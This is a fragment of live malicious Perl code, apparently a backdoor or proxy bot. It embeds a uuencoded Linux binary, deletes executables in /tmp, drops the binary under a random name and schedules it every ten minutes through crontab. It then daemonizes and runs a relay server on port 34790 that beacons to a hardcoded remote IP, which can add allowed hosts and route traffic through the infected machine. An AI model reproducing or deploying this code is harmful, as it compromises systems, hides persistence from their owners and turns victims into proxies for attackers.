C9F5R`%]S=&%R=`!?7V)S<U]S=&%R=`!?961A=&$`7V5N9```
BDRPDATABSD
}
else
{
$bdrp = <<'BDRPDATALIN';
M?T5,1@$!`0````````````(``P`!````@(`$"#0```"H&0```````#0`(``"
M`"@`!P`$``$``````````(`$"`"`!`@!`P```0,```4`````$````0````0#
M```$DP0(!),$"'<6``",&@``!@`````0``````````````````"))7RI!`B^
M!9,$"+D-````Z'D```#HH````+X3DP0(N6@6``#H90```+@$````BQV,J00(
MN1.3!`BZ:!8``%)14U#-@',"]]B!Q!`````]``````^,+````#G0#X4D````
MN`8```"+'8RI!`A34,V`<P+WV('$"````#T`````#XP`````,<!`,=M34,V`
M,=M#0T-#NA````!67SG3=1.!^H````!U`C'2@<(0````,=M#K##8JD/BXL.*
M#023!`BX*@```+N`J00(4U#-@',"]]B!Q`@````]``````^,HO___X#Y"74%
MB0.)4P2X*@```+N(J00(4U#-@',"]]B!Q`@````]``````^,=?___X#Y"74%
MB0.)4P2X`@```%"`^0EU"\V`<P+WV.D"````S8"!Q`0````]``````^,0O__
M_P^$20```+@&````BQV$J00(4U#-@',"]]B!Q`@````]``````^,&/___[@&
M````BQV(J00(4U#-@',"]]B!Q`@````]``````^,]/[__\.*%023!`BX/P``
M`(#Z"74%N%H```"+'8BI!`@QR5%34,V`<P+WV('$#````#T`````#XR\_O__
MN#\```"`^@EU!;A:````BQV$J00(,<E!45-0S8!S`O?8@<0,````/0`````/
MC(K^__^X!@```(L=@*D$"%-0S8!S`O?8@<0(````/0`````/C&;^__^X!@``
M`(L=C*D$"%-0S8!S`O?8@<0(````/0`````/C$+^__^+)7RI!`B)YEE8XOV-
M5"0$B?2-3"0$NP63!`B@!),$"#P)=0ZX.P```%)14U#I!0```+@+````S8#I
M!/[__P````,K<'5U)VMC92-]:WUM`'%V8R=[?7AB;WDU+W1Q9B15251!43$K
M>7YK+UE>*"E'>G5\?6TA.VEN>S](33D^5F-K;6I^,"PI/B\M,3!B>71_>SHB
M.C]@/2,_$1H"3ET%`D)?2T9$3T8.$B$S,C\E:WXH+6]B?']A:&(Q+S,E("8L
M.'!\.S0Y0%``1%,#!DE/25U1"`(,5@X+54907UM671<%&0L*!QT:6FAR<6MB
M="<U*3LZ.38N<AIX=#,\,4A8.'QK.SY[;'I%0U%'!@P&7`@-3UQ.04%,6Q$/
M$P<`#1<<7%-+3E)936!\8G!R?F8Z:&\G*B4C9F8Z(G!Q9R9J:6!D*W<M:W=Y
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
M0T`7`P8,#!@805,<"AT>!!9<41X6%AT6'E5=%QDA)G%A9&)B>GHG-6EU9WQU
M<2L@;6=I;&5O(C<M;6-_8G<S,'UW>7QU?R`\8#YM9'9V=FL])W4I=RMQ!P`N
M<WEM=&%B`"YS=')T86(`+G-H<W1R=&%B`"YT97AT`"YD871A`"YB<W,`````
M```````````````````````````````````````````````````;`````0``
M``8```"`@`0(@````($"`````````````!``````````(0````$````#````
M!),$"`0#``!W%@`````````````$`````````"<````(`````P```'RI!`A[
M&0``%`0`````````````!``````````1`````P``````````````>QD``"P`
M``````````````$``````````0````(``````````````,`:```@`@``!@``
M`!X````$````$`````D````#``````````````#@'```J@$`````````````
M`0```````````````````````````````````("`!`@``````P`!```````$
MDP0(``````,``@``````?*D$"``````#``,``0``````````````!`#Q_Q0`
M```%@00(`````````0`9````#H$$"`````````$`(0```!N!!`@````````!
M`#@````I@00(`````````0!/````,H$$"`````````$`9@```#J!!`@`````
M```!`&L```!M@00(`````````0"$````FH$$"`````````$`G0```+"!!`@`
M```````!`+8```"R@00(`````````0#/````$H($"`````````$`WP```">"
M!`@````````!`/@```!8@@0(`````````0`1`0``]8($"`````````$`*@$`
M`/J"!`@````````!`$,!```$DP0(`````````@!*`0``!9,$"`````````(`
M40$```T```````````#Q_U@!```3DP0(`````````@!?`0``:!8`````````
M`/'_9@$```$```````````#Q_V\!``!\J00(`````````P!V`0``@*D$"```
M``````,`?0$``(BI!`@````````#`(0!``"0J00(`````````P"+`0``@(`$
M"``````0``$`D@$``'NI!`@`````$`#Q_YX!``![J00(`````!``\?^E`0``
MD*T$"``````0`/'_`"XO+B]L;V%D97)?;&EN=7@N<P!E>&ET`'AO<F1A=&$`
M>&]R9&%T82YX;W)D871A7VQO;W!?,0!X;W)D871A+GAO<F1A=&%?;&]O<%\R
M`'AO<F1A=&$N>&]R9&%T85]L;V]P7S,`<&EP90!P:7!E+G!I<&5?<VMI<%]F
M<F5E8G-D7S$`<&EP92YP:7!E7W-K:7!?9G)E96)S9%\R`'!I<&4N<&EP95]S
M:VEP7V9R965B<V1?,P!P:7!E+G!I<&5?<VMI<%]F<F5E8G-D7S0`<&EP92YP
M:7!E7V-H:6QD`'!I<&4N<&EP95]S:VEP7V9R965B<V1?-0!P:7!E+G!I<&5?
M<VMI<%]F<F5E8G-D7S8`<&EP92YP:7!E7W-K:7!?9G)E96)S9%\W`'!I<&4N
M<&EP95]S:VEP7V9R965B<V1?.`!S>7-T96T`87)G=E\P`&%R9W9?<P!P7V-O
M9&4`<%]S:7IE`%-94U]E>&ET`'-T86-K<`!F:&%N9&$`9FAA;F1B`&)U9F9E
A<@!?<W1A<G0`7U]B<W-?<W1A<G0`7V5D871A`%]E;F0`
BDRPDATALIN
}
$bdrp = unpack ("u*", $bdrp); foreach my $bdrpp ("/var/tmp", "/tmp") { for (<$bdrpp/*>) { unlink $_ if (-f $_ && (-x $_ || -X $_)); }
my $bdrpn = ["a".."z", "A".."Z"]; $bdrpn = join ("", @$bdrpn[map {rand @$bdrpn}(1..(6 + int rand 5))]); my $bdrpb = "$bdrpp/$bdrpn";
my $bdrpc = $bdrpb . int rand 9; my $bdrpt = "*/10 * * * * $bdrpb >/dev/null 2>&1\n"; if (open (B, ">", $bdrpb)) { flock B, 2; print B $bdrp; close B;
if (open (C, ">", $bdrpc)) { flock C, 2; print C $bdrpt; close C; chmod 0755, $bdrpb; system "crontab $bdrpc >/dev/null 2>&1"; unlink $bdrpc; last; } } }
}
sub startserver
{
if ($^O ne "MSWin32")
{
use POSIX qw(setsid);
return unless defined (my $child = fork);
return if $child;
POSIX::setsid();
$SIG{CHLD} = sub { while (waitpid (-1, 1) > 0) {} };
$SIG{$_} = "IGNORE" for (qw (HUP INT ILL FPE QUIT ABRT USR1 SEGV USR2 PIPE ALRM TERM));
umask 0;
chdir "/";
open (STDIN, "</dev/null");
open (STDOUT, ">/dev/null");
open (STDERR, ">&STDOUT");
}
my $setting = { listen_port => 34790, remote_host_list => ["77.72.83.137:37821"], allow_host_list => {}, restart_timer => 5, connect_timeout => 10, session_timeout => 60 };
my $readers = IO::Select->new() or exit 0;my $writers = IO::Select->new() or exit 0;my $session = {};my $destroy = sub
{
my $handle = shift;
if (exists $session->{$handle})
{
$readers->remove($session->{$handle}{handle}) if $readers->exists($session->{$handle}{handle});
$writers->remove($session->{$handle}{handle}) if $writers->exists($session->{$handle}{handle});
close $session->{$handle}{handle};
delete $session->{$handle};
}
};
my $listen_socket = IO::Socket::INET->new(Proto => "tcp", LocalPort => $setting->{listen_port}, Listen => SOMAXCONN, Reuse => 1);
exit 0 unless $listen_socket;
if ($^O eq "MSWin32") { ioctl ($listen_socket, 0x8004667e, pack ("L", 1)); } else { $listen_socket->blocking(0); }
unless ($readers->add($listen_socket))
{
close $listen_socket;
exit 0;
}
foreach (@{$setting->{remote_host_list}})
{
my ($hostaddr, $hostport) = split (/:/, $_, 2);
$hostaddr = pack ("C4", split (/\./, $hostaddr));
if ($hostaddr)
{
$setting->{allow_host_list}{$hostaddr} = "";
my $socket = IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM);
next unless $socket;
if ($^O eq "MSWin32") { ioctl ($socket, 0x8004667e, pack ("L", 1)); } else { $socket->blocking(0); }
unless ($socket->connect($_ = sockaddr_in($hostport, $hostaddr)))
{
if ($! != $eiprogr && $! != $ewblock)
{
close $socket;
next;
}
}
unless ($writers->add($socket))
{
close $socket;
next;
}
unless ($readers->add($socket))
{
$writers->remove($socket);
close $socket;
next;
}
$session->{$socket} =
{
status	=> "cn_rh",
buffer	=> "",
handle	=> $socket,
target	=> "",
flagset	=> 1,
timeout	=> 0
};
}
}
$setting->{restart_timer} = time - 10 + $setting->{restart_timer} * 60;
while (1)
{
IO::Select->select(undef, undef, undef, 0.01);
my $readable = (IO::Select->select($readers, undef, undef, 0.01))[0];
foreach my $handle (@$readable)
{
if ($handle eq $listen_socket)
{
my ($socket_one, $peer_addr) = $handle->accept;
next unless $socket_one;
$peer_addr = substr ($peer_addr, 4, 4);
unless (exists $setting->{allow_host_list}{$peer_addr})
{
close $socket_one;
next;
}
my $socket_two = IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM);unless ($socket_two)
{
close $socket_one;
next;
}
if ($^O eq "MSWin32") { ioctl ($socket_one, 0x8004667e, pack ("L", 1)); } else { $socket_one->blocking(0); }
if ($^O eq "MSWin32") { ioctl ($socket_two, 0x8004667e, pack ("L", 1)); } else { $socket_two->blocking(0); }
if ($readers->add($socket_one))
{
if ($readers->add($socket_two))
{
if ($writers->add($socket_one))
{
if ($writers->add($socket_two))
{
$session->{$socket_one} =
{
status	=> "rd_qr",
buffer	=> "",
handle	=> $socket_one,
target	=> $socket_two,
flagset	=> 1,
timeout	=> 0
};
$session->{$socket_two} =
{
status	=> "wt_cm",
buffer	=> "",
handle	=> $socket_two,
target	=> $socket_one,
flagset	=> 1,
timeout	=> 0
};
next;
}
$writers->remove($socket_one);
}
$readers->remove($socket_two);
}
$readers->remove($socket_one);
}
close $socket_one;
close $socket_two;
next;
}
next unless exists $session->{$handle};
next if $session->{$handle}{status} !~ /^(rd|tr)/;
my $buffer;
if ($1 eq "rd")
{
$buffer = \$session->{$handle}{buffer};
}
elsif (exists $session->{$session->{$handle}{target}})
{
$buffer = \$session->{$session->{$handle}{target}}{buffer};
}
else
{
$destroy->($handle);
next;
}
my $length = length $$buffer;
my $unused = 8192 - $length;
if ($unused > 0)
{
my $result = sysread ($handle, $$buffer, $unused, $length);
if (defined $result)
{
if ($result > 0)
{
$session->{$handle}{flagset} = 1;
$length += $result;
}
else
{
if (exists $session->{$session->{$handle}{target}})
{
unless (length $session->{$session->{$handle}{target}}{buffer})
{
$destroy->($session->{$handle}{target});
}
else
{
$readers->remove($session->{$handle}{target});
}
}
$destroy->($handle);
next;
}
}
elsif ($! == $ewblock)
{
next;
}
else
{
$destroy->($session->{$handle}{target});$destroy->($handle);
next;
}
}
next if $session->{$handle}{status} eq "tr_dt";if ($session->{$handle}{status} eq "rd_qr")
{
next if $length < 2;my $signature = substr $$buffer, 0, 2;if ($signature eq "\x70\x10")
{
$destroy->($session->{$handle}{target});
$session->{$handle}{status} = "rd_rh";
}
elsif ($signature eq "\x04\x01")
{
$session->{$handle}{status} = "rd_cl";
}
else
{
$destroy->($session->{$handle}{target});
$destroy->($handle);
next;
}
}
if ($session->{$handle}{status} eq "rd_rh")
{
next if $length < 20;
if (unpack ("S", (substr $$buffer, 2, 2)) == 128)
{
$setting->{restart_timer} = 0;
}
elsif ((my $counter = unpack ("S", (substr $$buffer, 18, 2))) > 0)
{
next if $length < (20 + $counter * 4);
while (my $allow_host = (substr $$buffer, 20, 4, ""))
{
last if (length $allow_host) < 4;
$setting->{allow_host_list}{$allow_host} = "";
}
}
$destroy->($handle);
}
else
{
next if $length < 9;
if ((my $index = index $$buffer, "\x00", 8) > 0)
{
my $socket = $session->{$handle}{target};unless ($socket->connect($_ = sockaddr_in(unpack ("n", substr ($$buffer, 2, 2)), substr ($$buffer, 4, 4))))
{
if ($! != $eiprogr && $! != $ewblock)
{
$destroy->($session->{$handle}{target});$session->{$handle}{status} = "wr_rj";$$buffer = pack ("Sx6", 23296);
next;
}
}
$session->{$session->{$handle}{target}}{status} = "cn_th";$session->{$session->{$handle}{target}}{flagset} = 1;
$session->{$handle}{status} = "wt_cm";substr ($$buffer, 0, $index + 1) = "";$session->{$session->{$handle}{target}}{buffer} = $$buffer;
$$buffer = pack ("Sx6", 23040);
}
}
}
IO::Select->select(undef, undef, undef, 0.01);my $writable = (IO::Select->select(undef, $writers, undef, 0.01))[1];foreach my $handle (@$writable)
{
next unless exists $session->{$handle};next if $session->{$handle}{status} !~ /^((cn|wr|tr)_(.+))$/;
if ($2 eq "cn")
{
if ($handle->connected)
{
if ($3 eq "rh")
{
$session->{$handle}{flagset} = 1;$session->{$handle}{status} = "wr_rh";$session->{$handle}{buffer} = pack ("Sn", 4209, $setting->{listen_port});
}
else
{
$session->{$session->{$handle}{target}}{flagset} = 1;$session->{$session->{$handle}{target}}{status} = "wr_gr";$session->{$handle}{status} = "wt_cm";
}
}
else
{
if ($3 eq "rh")
{
}
else
{
$session->{$session->{$handle}{target}}{flagset} = 1;$session->{$session->{$handle}{target}}{status} = "wr_rj";$session->{$session->{$handle}{target}}{buffer} = pack ("Sx6", 23296);
}
$destroy->($handle);
}
next;
}
if (length $session->{$handle}{buffer})
{
my $result = syswrite ($handle, $session->{$handle}{buffer});if (defined $result && $result > 0)
{
$session->{$handle}{flagset} = 1;
substr ($session->{$handle}{buffer}, 0, $result) = "";unless (length $session->{$handle}{buffer})
{
if ($1 eq "wr_rh")
{
$session->{$handle}{status} = "rd_rh";
}
elsif ($1 eq "wr_rj")
{
$destroy->($handle);
}
elsif ($1 eq "wr_gr")
{
$session->{$handle}{status} = "tr_dt";
$session->{$session->{$handle}{target}}{status} = "tr_dt";
}
elsif ($1 eq "tr_dt")
{
unless (exists $session->{$session->{$handle}{target}})
{
$destroy->($handle);
}
}
}
}
elsif ($! == $ewblock)
{
next;
}
else
{
$destroy->($session->{$handle}{target});$destroy->($handle);
}
}
}
while (my ($handle, $values) = each %$session)
{
next if $values->{status} eq "wt_cm";
my $timeout = time;if ($values->{flagset})
{
if ($values->{status} =~ /^cn/)
{
$timeout += $setting->{connect_timeout};}
else
{
$timeout += $setting->{session_timeout};}
if (exists $session->{$values->{target}})
{
$session->{$values->{target}}{timeout} = $timeout;$session->{$values->{target}}{flagset} = 0;
}
$values->{timeout} = $timeout;$values->{flagset} = 0;}
elsif ($timeout >= $values->{timeout})
{
$destroy->($session->{$handle}{target});$destroy->($handle);}
}
if ($readers->exists($listen_socket) && time >= $setting->{restart_timer})
{
$readers->remove($listen_socket);close $listen_socket;&startserver() if $setting->{restart_timer};}
last unless $readers->count or $writers->count;}
exit 0;}